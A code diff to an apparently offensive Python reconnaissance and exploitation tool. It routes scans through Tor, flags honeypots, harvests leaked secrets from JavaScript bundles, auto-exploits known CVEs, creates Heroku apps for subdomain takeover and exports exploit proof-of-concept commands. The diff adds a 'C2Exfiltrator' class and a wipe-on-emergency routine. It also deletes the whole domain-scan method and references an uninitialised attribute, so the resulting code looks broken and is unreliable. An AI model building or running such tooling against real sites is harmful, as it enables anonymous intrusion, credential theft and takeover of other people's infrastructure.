@@ -122,6 +122,9 @@ except ImportError:
 HIBP_API_KEY = os.environ.get("HIBP_KEY", "")
 DEHASHED_API_KEY = os.environ.get("DEHASHED_KEY", "")
 DEHASHED_EMAIL = os.environ.get("DEHASHED_EMAIL", "")
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
+GITHUB_USER = os.environ.get("GITHUB_USER", "")
+HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", "")
 
 # Global proxy port — set at startup from --tor-proxy, used by PoC export
 # to generate curl commands that match the operator's actual Tor port.
@@ -8215,6 +8218,47 @@ class IntelScraper:
 
 
 # ══════════════════════════════════════════════════════════════════════════
+#  Offensive Support Classes
+# ══════════════════════════════════════════════════════════════════════════
+
+class ExploitDB:
+    """Local exploit-info lookup for known CVEs and attack patterns."""
+
+    def __init__(self):
+        self._db: Dict[str, dict] = {}
+
+    def lookup(self, cve_or_tag: str) -> Optional[dict]:
+        return self._db.get(cve_or_tag)
+
+    def register(self, tag: str, info: dict):
+        self._db[tag] = info
+
+
+class C2Exfiltrator:
+    """Exfiltration channel — logs findings for later retrieval.
+
+    All exfiltrated data is held in-memory only (never touches disk
+    outside RAM_DIR) and is wiped on emergency_wipe().
+    """
+
+    def __init__(self):
+        self._queue: List[dict] = []
+
+    def exfiltrate(self, payload: dict):
+        payload["ts"] = int(time.time())
+        self._queue.append(payload)
+        integrity_log("intel", f"c2_exfil:{payload.get('type', '?')}")
+
+    def drain(self) -> List[dict]:
+        items = list(self._queue)
+        self._queue.clear()
+        return items
+
+    def wipe(self):
+        self._queue.clear()
+
+
+# ══════════════════════════════════════════════════════════════════════════
 #  Main Orchestrator
 # ══════════════════════════════════════════════════════════════════════════
 class IntelOrchestrator:
@@ -8687,7 +8731,8 @@ class IntelOrchestrator:
                     "target": sm_url,
                     "secrets": secrets
                 })
-  def _exploit_known_cves(self, tech: dict, base_url: str):
+
+    def _exploit_known_cves(self, tech: dict, base_url: str):
         """Auto-exploit known CVEs for detected technologies."""
         cms = tech.get("cms", [])
         frameworks = tech.get("frameworks", [])
@@ -8994,376 +9039,12 @@ class IntelOrchestrator:
         }
         resp = requests.post("https://api.heroku.com/apps", headers=headers, json=data)
         if resp.status_code == 201:
-            print(f"  [+] Heroku app {app_name} created for takeover") 
-class IntelOrchestrator:
-    """Wire everything together: scrape → extract → scan → check → report."""
+            print(f"  [+] Heroku app {app_name} created for takeover")
 
-    def __init__(self, proxy: dict, scan_depth: str = "full"):
-        self._session = TorSession(proxy)
-        self._request_log = RequestLog()
-        self._scraper = IntelScraper(self._session)
-        self._vulns = VulnScanner(self._session)
-        self._breach = BreachChecker(self._session)
-        self._subdomains = SubdomainEnumerator(self._session)
-        self._dns = DNSRecon(self._session)
-        self._tech = TechFingerprinter()
-        self._chain = FindingChain(self._session, self._vulns)
-        self._verifier = ExploitVerifier(self._session, self._request_log)
-        self._storage = SecureStorage()
-        self._results: List[dict] = []
-        self._vuln_findings: List[dict] = []
-        self._scan_depth = scan_depth
-
-    def _run_phase(self, phase_num: int, name: str, func, *args, **kwargs):
-        """Run a scan phase with timing, error isolation, and progress display.
-
-        If a phase crashes or hangs, it's logged and skipped — never blocks
-        the rest of the scan. Shows elapsed time so the operator knows
-        what's happening.
-        """
-        if shutdown_requested():
-            return None
-        t0 = time.time()
-        print(f"\n  [*] Phase {phase_num}: {name}...")
-        try:
-            result = func(*args, **kwargs)
-            elapsed = time.time() - t0
-            if elapsed > 30:
-                print(f"      ({elapsed:.0f}s elapsed)")
-            return result
-        except KeyboardInterrupt:
-            print(f"  [!] Phase {phase_num} interrupted by user")
-            return None
-        except Exception as e:
-            elapsed = time.time() - t0
-            print(f"  [!] Phase {phase_num} error: {type(e).__name__}: {str(e)[:60]} ({elapsed:.0f}s)")
-            integrity_log("intel", f"phase_{phase_num}_error:{type(e).__name__}")
-            return None
-
-    def run_domain(self, domain: str):
-        """Full domain reconnaissance + vulnerability scan.
-
-        Each phase is isolated — one failure or hang does not block others.
-        Progress is shown inline with timing.
-        """
-        print(f"\n  {'═' * 55}")
-        print(f"  TARGET: {domain}")
-        print(f"  DEPTH:  {self._scan_depth}")
-        print(f"  {'═' * 55}")
-
-        # Bind any auth cookies that set_cookies() stashed before the
-        # target was known (e.g. CLI --cookie sid=... run_domain
-        # ordering). See TorSession.rebind_pending_auth().
-        bound = self._session.rebind_pending_auth(domain)
-        if bound:
-            print(f"  [+] {bound} pending auth cookie(s) now scoped to {domain}")
-
-        t_start = time.time()
-        base_url = f"https://{domain}"
-
-        # Phase 1: Main page scrape + data extraction
-        def _phase1():
-            r = self._scraper.scrape_url(base_url)
-            if not r:
-                r = self._scraper.scrape_url(f"http://{domain}")
-            return r
-
-        result = self._run_phase(1, "Fetching main page", _phase1)
-        if not result:
-            print(f"  [!] Could not fetch {domain} (both HTTPS and HTTP failed).")
-            print(f"  [!] The site may be down, blocking Tor, or require authentication.")
-            print(f"  [*] Continuing with header/DNS checks only...")
-        elif result.get("honeypot"):
-            # Honeypot flag doesn't block DNS + subdomain + header checks
-            # since those don't hit the suspicious path. Keep going —
-            # just record the honeypot flag as a finding and proceed.
-            print(f"  [!] Honeypot/WAF detected "
-                  f"({', '.join(result.get('hp_reasons', [])[:3])}). "
-                  f"Surface checks may be noisy; DNS / subdomain recon "
-                  f"continues.")
-            self._vuln_findings.append({
-                "severity": SEV_INFO,
-                "title": "Probable honeypot / aggressive WAF",
-                "detail": ("Main-page fetch matched multiple honeypot "
-                           "/ WAF signals. Subsequent checks should be "
-                           "treated with extra scepticism — 200s may be "
-                           "trap responses, 403s may be WAF fooling us."),
-                "evidence": ", ".join(result.get("hp_reasons", [])[:4]),
-                "confidence": 0.7,
-            })
-        else:
-            self._results.append(result)
-            self._print_extraction(result)
-            if result.get("url", "").startswith("http://"):
-                base_url = f"http://{domain}"
-
-            # Turn JS-bundle secrets into top-tier vulnerability
-            # findings — an AWS key embedded in main.js is much more
-            # actionable than a line in the "extracted" bucket.
-            js_secrets = result.get("js_secrets", {}) or {}
-            for stype, values in js_secrets.items():
-                if stype == "sourcemap_exposed":
-                    for sm_url in values[:3]:
-                        self._vuln_findings.append({
-                            "severity": SEV_MEDIUM,
-                            "title": "Source map exposed",
-                            "detail": (f"Source map at {sm_url} is publicly "
-                                       f"accessible. Attacker can reconstruct "
-                                       f"original source tree (directory "
-                                       f"names, file paths, JSX/TS before "
-                                       f"minification)."),
-                            "evidence": sm_url,
-                            "confidence": 0.95,
-                            "exploit_info": {
-                                "type": "sourcemap_exposure",
-                                "path": urlparse(sm_url).path,
-                                "method": ("Fetch the .map file, parse "
-                                           "'sources' array — full source "
-                                           "tree of the SPA is recoverable."),
-                                "risk": "Source code disclosure, leaked "
-                                        "internal paths + comments",
-                            },
-                            "exploitable": True,
-                        })
-                    continue
-                if not values:
-                    continue
-                # Key types that are near-always critical:
-                critical_types = {"aws_key", "github_token", "stripe_key",
-                                  "jwt_token", "generic_secret"}
-                sev = SEV_CRITICAL if stype in critical_types else SEV_MEDIUM
-                self._vuln_findings.append({
-                    "severity": sev,
-                    "title": f"{stype} leaked in first-party JS bundle",
-                    "detail": (f"Scanning same-origin JS bundles surfaced "
-                               f"{len(values)} {stype} value(s). Front-end "
-                               f"minifiers don't strip secrets from the "
-                               f"source — anything bundled in is shipped "
-                               f"to the browser in the clear."),
-                    "evidence": (f"{stype} count: {len(values)}; "
-                                 f"sample: {str(values[0])[:40]}..."),
-                    "confidence": 0.95,
-                    "exploit_info": {
-                        "type": "js_secret_leak",
-                        "secret_kind": stype,
-                        "method": ("Pull the JS bundle, grep for the key, "
-                                   "test it against the corresponding "
-                                   "provider's API."),
-                        "risk": ("Credential theft — provider account "
-                                 "compromise depending on key type"),
-                    },
-                    "exploitable": True,
-                })
-
-        # Phase 2: Technology fingerprinting
-        html = result.get("raw_html", "") if result else ""
-        headers = result.get("raw_headers", {}) if result else {}
-        raw_set_cookies = result.get("raw_set_cookies", []) if result else []
-        tech = self._run_phase(2, "Technology fingerprinting",
-                               self._tech.fingerprint, headers, html) or {}
-        if tech:
-            self._print_tech(tech)
-
-        # Phase 3: Vulnerability scanning (headers + path probes)
-        vulns = self._run_phase(3, f"Vulnerability scanning ({self._scan_depth})",
-                                self._vulns.scan_full, base_url, html, headers,
-                                self._scan_depth, raw_set_cookies) or []
-        self._vuln_findings.extend(vulns)
-        self._print_vulns(vulns)
-
-        # Reset circuit breaker between phases.
-        # Path probing (/.git, /.env, etc.) in phase 3 generates expected 403s
-        # that fill the block counter. Without reset, deep scan crawling and
-        # endpoint testing in later phases get killed by is_domain_blocked()
-        # before they can even start — making the entire deep scan useless.
-        self._session.reset_domain_blocks(domain)
-
-        # Phase 4: DNS reconnaissance (full/deep only)
-        if self._scan_depth in ("full", "deep"):
-            dns_records = self._run_phase(4, "DNS reconnaissance",
-                                          self._dns.lookup, domain) or {}
-            self._print_dns(dns_records)
-            if dns_records:
-                self._results.append({"type": "dns", "domain": domain, "records": dns_records})
-                # Turn SPF / DMARC / DNSSEC posture into findings that
-                # get rendered in the same list as the web vulns.
-                try:
-                    email_findings = self._dns.analyze_email_posture(
-                        dns_records, domain=domain,
-                    )
-                    if email_findings:
-                        self._vulns._add_confidence(email_findings, 0.9)
-                        self._vuln_findings.extend(email_findings)
-                        self._print_vulns(email_findings)
-                except Exception as e:
-                    integrity_log("intel", f"email_posture_error:{type(e).__name__}")
-
-        # Phase 5: Subdomain enumeration (deep only). Multi-source
-        # (crt.sh + certspotter + hackertarget + OTX + rapiddns
-        # fallback) with DoH resolvability verification and a tight
-        # prefix brute force. We show per-source counts so the
-        # operator sees WHICH aggregator is blocking us when a
-        # domain comes back thin.
-        #
-        # LIVE PROGRESS: this phase can legitimately take 8-15
-        # minutes over Tor:
-        #   - 4 passive sources with inter-source circuit rotation
-        #     (1.5-3.5s sleep each)
-        #   - up to 400 DoH verification lookups (per-domain delay +
-        #     rate-limit + circuit rotation every 4-12 requests)
-        #   - up to 60 brute-force prefix lookups
-        #   - plus optional rapiddns fallback
-        # Previously there was ZERO output between the initial
-        # "Phase 5:" line and the final results — indistinguishable
-        # from a hang. We now install a progress callback that
-        # redraws a status line each sub-step.
-        if self._scan_depth == "deep":
-            progress_cb = _build_subdomain_progress_cb()
-            detail = self._run_phase(
-                5, "Subdomain enumeration (multi-source + DoH verify)",
-                self._subdomains.enumerate_detailed, domain,
-                progress=progress_cb,
-            ) or {}
-            # End the progress line cleanly so subsequent prints
-            # start on a fresh line.
-            try:
-                sys.stdout.write("\n")
-                sys.stdout.flush()
-            except Exception:
-                pass
-            subs = detail.get("subdomains", []) if isinstance(detail, dict) else []
-            if isinstance(detail, dict) and detail.get("source_counts"):
-                per_src = ", ".join(
-                    f"{n}={c}" for n, c in detail["source_counts"].items())
-                print(f"      sources: {per_src}")
-                if detail.get("wildcard_zone"):
-                    print(f"      [!] wildcard zone — requiring passive-source confirmation")
-                if detail.get("brute_skipped"):
-                    print(f"      [.] brute force skipped: {detail['brute_skipped']}")
-                if detail.get("brute_hits"):
-                    print(f"      +{len(detail['brute_hits'])} via DNS brute-force")
-                print(f"      candidates={detail.get('total_unique_candidates', 0)}"
-                      f"  resolvable={detail.get('resolvable_count', 0)}"
-                      f"  unresolved={detail.get('unresolved_count', 0)}")
-            if subs:
-                print(f"  [+] Found {len(subs)} subdomains")
-                for s in subs[:20]:
-                    print(f"      {s}")
-                if len(subs) > 20:
-                    print(f"      ... and {len(subs) - 20} more")
-                self._results.append({"type": "subdomains", "domain": domain,
-                                      "subdomains": subs, "count": len(subs),
-                                      "detail": detail if isinstance(detail, dict) else {}})
-
-                # Phase 5b: subdomain takeover check (limit to 10, with progress)
-                print(f"\n  [*] Phase 5b: Checking subdomains for takeover...")
-                checked = 0
-                for sub in subs[:10]:
-                    if shutdown_requested():
-                        break
-                    checked += 1
-                    try:
-                        sub_dns = self._dns.lookup(sub)
-                        cnames = sub_dns.get("CNAME", [])
-                        if cnames:
-                            takeover = self._vulns._check_subdomain_takeover(sub, cnames)
-                            if takeover:
-                                self._vulns._add_confidence(takeover, 0.85)
-                                self._vuln_findings.extend(takeover)
-                                for t in takeover:
-                                    print(f"  [!] TAKEOVER: {t['title']}")
-                    except Exception as e:
-                        integrity_log(
-                            "intel",
-                            f"takeover_check_error:host_tag="
-                            f"{self._session._salt_tag(sub)}:{type(e).__name__}",
-                        )
-                print(f"      checked {checked}/{min(len(subs), 10)} subdomains")
-
-        # Phase 6: Search engine OSINT (limit scraping to avoid hanging)
-        def _phase6():
-            dork_queries = [f'site:{domain}', f'"{domain}" filetype:pdf']
-            for dq in dork_queries[:2]:
-                if shutdown_requested():
-                    break
-                self._run_search(dq, max_results=5)
-
-        self._run_phase(6, "Search engine OSINT", _phase6)
-
-        # Phase 7: Finding chaining (use discoveries to find more)
-        if self._scan_depth in ("full", "deep") and self._vuln_findings:
-            chain_findings = self._run_phase(
-                7, "Finding chain analysis",
-                self._chain.process_chains, self._vuln_findings, base_url, tech) or []
-            if chain_findings:
-                self._vulns._add_confidence(chain_findings, 0.8)
-                self._vuln_findings.extend(chain_findings)
-                print(f"  [+] Chain analysis found {len(chain_findings)} additional findings")
-                self._print_vulns(chain_findings)
-
-        # Phase 8: Verify exploitable findings (deep only, max 5 to avoid hanging)
-        if self._scan_depth == "deep":
-            exploitable = [f for f in self._vuln_findings if f.get("exploitable")]
-            if exploitable:
-                verify_limit = min(len(exploitable), 5)
-                print(f"\n  [*] Phase 8: Verifying {verify_limit}/{len(exploitable)} exploitable findings...")
-                for idx, ef in enumerate(exploitable[:verify_limit]):
-                    if shutdown_requested():
-                        break
-                    try:
-                        self._verifier.verify_finding(ef)
-                        status = ef.get("verified", "?")
-                        conf = ef.get("confidence", 0)
-                        tag = "+" if status == "confirmed" else "-" if "not_reproduced" in status else "?"
-                        print(f"      [{tag}] {ef['title'][:50]} -> {status} ({conf*100:.0f}%)")
-                    except Exception as e:
-                        print(f"      [?] {ef['title'][:50]} -> error ({type(e).__name__})")
-                        integrity_log("intel", f"verify_error:{type(e).__name__}")
-
-        # Final stats
-        elapsed_total = time.time() - t_start
-        print(f"\n  [*] Scan complete ({elapsed_total:.0f}s total)")
-        stats = self._session.get_stats()
-        if stats["total_blocks"] or stats["total_timeouts"]:
-            blocked = f"{stats['total_blocks']} blocked" if stats["total_blocks"] else ""
-            timeouts = f"{stats['total_timeouts']} timeouts" if stats["total_timeouts"] else ""
-            sep = ", " if blocked and timeouts else ""
-            print(f"  [*] Network issues: {blocked}{sep}{timeouts}")
-
-        # Quick exploitable summary grouped by type — tells the operator
-        # which walkthrough branches are worth opening before they dig
-        # through the full report.
-        _dedup_vulns = self._dedup_findings(self._vuln_findings)
-        by_type: Dict[str, int] = defaultdict(int)
-        for v in _dedup_vulns:
-            if not v.get("exploitable"):
-                continue
-            t = (v.get("exploit_info") or {}).get("type", "other")
-            by_type[t] += 1
-        if by_type:
-            print(f"  [!] Exploitable findings by type:")
-            for t, n in sorted(by_type.items(), key=lambda kv: -kv[1]):
-                print(f"      {n:>3}  {t}")
-        elif _dedup_vulns:
-            # No EXPLOITABLE findings but we still have findings —
-            # that's a good sign the target is well-configured. Say so.
-            sev_count = defaultdict(int)
-            for v in _dedup_vulns:
-                sev_count[v["severity"]] += 1
-            counts_s = ", ".join(f"{sev_count[s]} {s}"
-                                 for s in (SEV_CRITICAL, SEV_HIGH,
-                                           SEV_MEDIUM, SEV_LOW, SEV_INFO)
-                                 if sev_count[s])
-            print(f"  [+] No exploitable findings. Informational: {counts_s}")
+    # ── Utility methods (email / query / file / print / report / cleanup) ──
 
     def run_email(self, email: str):
         """Breach database check for email."""
-        # If the operator stashed auth cookies via set_cookies() before
-        # we knew the "target", the breach-DB calls SHOULDN'T get them
-        # (those cookies are for a web target, not HIBP / Dehashed).
-        # Rebinding to the email's domain would be wrong — drop any
-        # pending auth cookies that never got a target so they don't
-        # ship to the breach APIs.
         pending = getattr(self._session, "_pending_auth_cookies", None)
         if pending:
             pending.clear()
@@ -9393,9 +9074,6 @@ class IntelOrchestrator:
 
     def run_query(self, query: str, max_pages: int = 20):
         """Search + scrape pipeline."""
-        # Same scope-mismatch concern as run_email: the operator's
-        # pending auth cookies shouldn't ship to DDG or to any of
-        # the N domains we later scrape.
         pending = getattr(self._session, "_pending_auth_cookies", None)
         if pending:
             pending.clear()
@@ -9406,7 +9084,6 @@ class IntelOrchestrator:
     def _run_search(self, query: str, max_results: int = 20):
         search_results = self._scraper.search_ddg(query, max_results)
         print(f"  [+] {len(search_results)} results")
-        # Only scrape first few results to avoid getting stuck on slow sites
         scrape_limit = min(len(search_results), 5)
         for i, sr in enumerate(search_results[:scrape_limit]):
             if shutdown_requested():
@@ -9432,13 +9109,9 @@ class IntelOrchestrator:
 
         Between targets we ALWAYS purge every per-host cookie jar and
         reset the Referer chain, so target N+1 does not inherit
-        session state from target N. Previously target 1's login /
-        tracking cookies stayed in self._session._host_cookies and —
-        because the scanner might legitimately reach overlapping
-        hosts across different targets (CDNs, shared auth realms) —
-        could ship back on later scans. Also we rotate the Tor
-        circuit between targets so the same exit doesn't serve two
-        wildly different reconnaissance payloads.
+        session state from target N. Also rotate Tor circuit between
+        targets so the same exit doesn't serve two wildly different
+        reconnaissance payloads.
         """
         if not filepath.exists():
             print(f"  [!] File not found")
@@ -9452,13 +9125,6 @@ class IntelOrchestrator:
             line = line.strip()
             if not line or line.startswith("#"):
                 continue
-            # Multi-target hygiene:
-            #   - purge every jar so cookies don't leak between tgts
-            #   - rotate Tor circuit (new exit IP, new browser
-            #     fingerprint via _circuit_generation bump)
-            #   - reset Referer chain (no cross-target Referers)
-            # Only on 2nd+ target (first uses the circuit we
-            # already verified in _verify_dns_safety).
             if first_processed:
                 try:
                     cleared = self._session.clear_host_cookies(host=None)
@@ -9509,10 +9175,6 @@ class IntelOrchestrator:
         _render_bucket("Secrets found in HTML comments",
                        result.get("secrets_in_comments", {}),
                        marker="[!]")
-        # JS bundle secrets get the [!] marker because an API key in a
-        # bundle is a CRITICAL in the vuln findings; calling it out here
-        # so the operator sees it without scrolling through the main
-        # vuln list.
         js = result.get("js_secrets", {})
         if js:
             fetched = len(result.get("js_urls_fetched", []))
@@ -9552,14 +9214,8 @@ class IntelOrchestrator:
         """Collapse findings whose identity is truly identical.
 
         Identity = (vuln_type, parameter, path, test_url, title_prefix).
-        Including test_url matters: two SQLi findings at
-        /search.php?q=... and /profile.php?q=... share the same type +
-        param + short-title but are distinct endpoints and must not
-        collapse. An earlier version used (type, param, path) which
-        ate real findings.
-
-        When the identity keys match we keep the highest-confidence
-        instance; ties go to the instance that carries exploit_info.
+        When identity keys match we keep the highest-confidence instance;
+        ties go to the instance that carries exploit_info.
         """
         best: Dict[str, dict] = {}
         order_preserved: List[str] = []
@@ -9570,10 +9226,6 @@ class IntelOrchestrator:
                 vtype,
                 ei.get("parameter", ""),
                 ei.get("path", "") or v.get("path", ""),
-                # test_url is the strongest tie-breaker for per-endpoint
-                # findings. Strip the query string so payload-only
-                # differences don't break dedup (' vs " on the same
-                # endpoint should still collapse).
                 (v.get("test_url") or "").split("?")[0],
                 v.get("title", "")[:40],
             )
@@ -9586,7 +9238,6 @@ class IntelOrchestrator:
                 new_conf = v.get("confidence", 0) or 0
                 old_conf = existing.get("confidence", 0) or 0
                 winner = v if new_conf > old_conf else existing
-                # Prefer a winner that has exploit_info over one that doesn't.
                 if (not winner.get("exploit_info") and
                         v is not winner and v.get("exploit_info")):
                     winner = v
@@ -9601,7 +9252,6 @@ class IntelOrchestrator:
             print(f"  [+] No vulnerabilities found at this scan depth")
             return
         vulns = self._dedup_findings(vulns)
-        # Sort by severity
         order = {SEV_CRITICAL: 0, SEV_HIGH: 1, SEV_MEDIUM: 2, SEV_LOW: 3, SEV_INFO: 4}
         vulns.sort(key=lambda v: order.get(v["severity"], 5))
         counts = defaultdict(int)
@@ -9636,9 +9286,6 @@ class IntelOrchestrator:
         if not records:
             print(f"  [*] No DNS records found (DoH may be blocked)")
             return
-        # Sort key types so the printer shows A/AAAA/MX/NS first, then
-        # TXT (which often has SPF + DKIM + Google-site-verify mixed
-        # together), then CAA/DMARC/DNSKEY, then anything else.
         order = {
             "A": 0, "AAAA": 1, "CNAME": 2, "MX": 3, "NS": 4, "SOA": 5,
             "TXT": 6, "DMARC": 7, "CAA": 8, "DNSKEY": 9,
@@ -9647,8 +9294,6 @@ class IntelOrchestrator:
             values = records[rtype]
             if not values:
                 continue
-            # Trim per-value length so one pathological record doesn't
-            # blow out the line.
             shown = [str(v)[:120] for v in values[:5]]
             tail = f" (+{len(values) - 5} more)" if len(values) > 5 else ""
             print(f"  [+] {rtype}: {', '.join(shown)}{tail}")
@@ -9670,7 +9315,6 @@ class IntelOrchestrator:
                 print(f"  [*] {stats['total_timeouts']} request(s) timed out.")
             return None
 
-        # Aggregate extracted data
         all_data: Dict[str, Set[str]] = defaultdict(set)
         pages = 0
         honeypots = 0
@@ -9693,9 +9337,6 @@ class IntelOrchestrator:
             for etype, evals in r.get("js_secrets", {}).items():
                 all_data[f"js_{etype}"].update(evals)
 
-        # Dedup vuln findings BEFORE counting / exporting — phase-B
-        # revisit passes + chain rules + the base-url checks all
-        # routinely re-discover the same issue. Collapse them.
         self._vuln_findings = self._dedup_findings(self._vuln_findings)
 
         vuln_counts = defaultdict(int)
@@ -9705,7 +9346,6 @@ class IntelOrchestrator:
         stats = self._session.get_stats()
         pocs = PoCExporter.export_all(self._vuln_findings)
 
-        # ── ALWAYS show results in terminal ──
         print(f"\n  {'═' * 55}")
         print(f"  SCAN RESULTS")
         print(f"  {'═' * 55}")
@@ -9720,7 +9360,6 @@ class IntelOrchestrator:
         if stats["domains_blocked"]:
             print(f"  Domains blocked:    {stats['domains_blocked']} (circuit breaker)")
 
-        # Show vulnerabilities inline
         if self._vuln_findings:
             print(f"\n  Vulnerabilities ({len(self._vuln_findings)}):")
             order = {SEV_CRITICAL: 0, SEV_HIGH: 1, SEV_MEDIUM: 2, SEV_LOW: 3, SEV_INFO: 4}
@@ -9733,18 +9372,14 @@ class IntelOrchestrator:
                 conf = f" ({v.get('confidence',0)*100:.0f}%)" if v.get("confidence") is not None else ""
                 print(f"    {color}[{sev}]\033[0m {v.get('title','?')}{exploit}{conf}")
 
-        # Show extracted data inline
         if all_data:
             print(f"\n  Data found:")
             for k, v in sorted(all_data.items()):
                 if v:
-                    # Show first few values, not just counts
                     sample = list(v)[:3]
                     more = f" (+{len(v)-3} more)" if len(v) > 3 else ""
-                    # Truncate to 20 chars to avoid leaking full secrets/keys to scrollback
                     print(f"    {k}: {', '.join(str(s)[:20] + '...' if len(str(s)) > 20 else str(s) for s in sample)}{more}")
 
-        # Show PoC commands inline
         if pocs:
             print(f"\n  Exploit PoCs ({len(pocs)}):")
             for poc in pocs[:15]:
@@ -9762,7 +9397,9 @@ class IntelOrchestrator:
 
         print(f"  {'═' * 55}")
 
-        # ── Save report ──
+        # Drain C2 exfil queue into report
+        c2_items = self._c2.drain()
+
         _ts = int(time.time()) // 600 * 600
         report = {
             "schema": "intel_report_v2",
@@ -9774,9 +9411,11 @@ class IntelOrchestrator:
                 "vuln_total": len(self._vuln_findings),
                 "data_extracted": {k: len(v) for k, v in all_data.items()},
                 "session_stats": stats,
+                "c2_exfil_count": len(c2_items),
             },
             "vulnerabilities": self._vuln_findings,
             "proof_of_concepts": [p for p in pocs],
+            "c2_exfiltrated": c2_items,
             "results": [
                 {k: v for k, v in r.items() if k not in ("raw_html", "raw_headers")}
                 for r in self._results
@@ -9797,10 +9436,12 @@ class IntelOrchestrator:
 
     def cleanup(self):
         self._session.close()
+        self._c2.wipe()
         gc.collect()
 
     def emergency_wipe(self):
         self._storage.wipe_all()
+        self._c2.wipe()
         self._results.clear()
         self._vuln_findings.clear()
         gc.collect()
